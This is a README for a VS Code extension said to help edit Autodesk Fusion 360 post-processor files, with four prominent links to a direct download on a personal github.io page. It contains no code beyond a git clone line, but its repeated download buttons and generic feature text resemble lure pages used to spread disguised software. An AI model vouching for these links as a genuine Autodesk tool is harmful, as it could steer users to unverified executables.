# Autodesk Fusion 360 Post Editor v1.0 - VS Code extension 2026

> **A Visual Studio Code extension for Autodesk Fusion 360 post workflows that makes it easier to inspect post logic, review NC output, and move between generated output and the source behind it.**

[![Platform](https://img.shields.io/badge/Platform-Visual%20Studio%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-lewis87/fusion-post-nc-output?style=flat-square)](https://github.com/nathan-lewis87/fusion-post-nc-output)

---

<p align="center">
  <a href="https://nathan-lewis87.github.io/fusion-post-nc-output/">
    <img src="https://img.shields.io/badge/Download-Autodesk%20Fusion%20360%20Post%20Editor%20Latest-brightgreen?style=for-the-badge" alt="Download Autodesk Fusion 360 Post Editor">
  </a>
</p>

> **[Direct Download - Autodesk Fusion 360 Post Editor v1.0](https://nathan-lewis87.github.io/fusion-post-nc-output/)**

---

[Download Latest Build](https://nathan-lewis87.github.io/fusion-post-nc-output/)

---

## Overview

Autodesk Fusion 360 Post Editor is a Visual Studio Code extension designed for Autodesk post processor workflows. It gives you a more practical place to inspect, edit, and browse post-related files without leaving the editor you already use.

It is aimed at users working with Fusion 360, Inventor CAM, and HSMWorks post processor output. The extension is built to speed up review of post variables and functions, while also making it simpler to travel between NC output and the source that generated it.

---

## What it does

- Run post actions directly from Visual Studio Code
- View post processor variables and functions in a quick pane
- Jump from NC output lines back to the matching source code
- Support workflows focused on Autodesk Fusion 360 post processors
- Also useful for Inventor CAM and HSMWorks post-related tasks
- Editor-centered utility for post development and review
- Reduces back-and-forth between output files and source files

---

## Installation

1. Download the latest build from the project page.
2. Install or open the extension in Visual Studio Code.
3. Reload VS Code if prompted.

For source-based setup, clone the repository and open it in VS Code:

1. `git clone https://github.com/nathan-lewis87/fusion-post-nc-output.git
2. Open the project folder in Visual Studio Code
3. Launch or package the extension using your normal VS Code extension workflow

---

## Usage

Once installed, open your Autodesk post processor files or related NC output in Visual Studio Code. From there, you can examine post logic, browse available variables and functions, and use line navigation to return to the source that produced a specific output.

Typical workflow:
1. Open the post file in VS Code
2. Use the extension to inspect post variables and functions
3. Generate or review NC output
4. Click an NC output line to jump to the related code location
5. Continue editing and testing in the same workspace

---

## Configuration

Settings are managed through Visual Studio Code extension preferences and workspace files.

If your setup relies on project-specific paths or post-processing options, keep them in the VS Code workspace or user settings so they are easy to reuse between sessions. In shared environments, local changes should stay in the workspace configuration to keep behavior consistent.

Example layout:

{
  "autodeskFusion360PostEditor.enabled": true,
  "autodeskFusion360PostEditor.workspaceMode": "default"
}

---

## Requirements

- Visual Studio Code
- A compatible Autodesk post-processing workflow
- Access to Fusion 360, Inventor CAM, or HSMWorks post files when working with those sources
- Enough local storage for the extension, project files, and generated NC output

---

## FAQ

**Does it work inside Visual Studio Code?**  
Yes. The extension is built around the VS Code environment.

**What kind of files is it meant for?**  
It is intended for Autodesk post processor work and associated NC output review.

**Can I inspect post variables and functions?**  
Yes. A quick view is available for browsing post processor variables and functions.

**How do I move from output to source?**  
You can click NC output lines to jump to the corresponding code location.

**Where are updates published?**  
Use the download link above to check the latest build.

**What if I need to change settings?**  
Check your VS Code user or workspace settings, since extension options are handled there.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
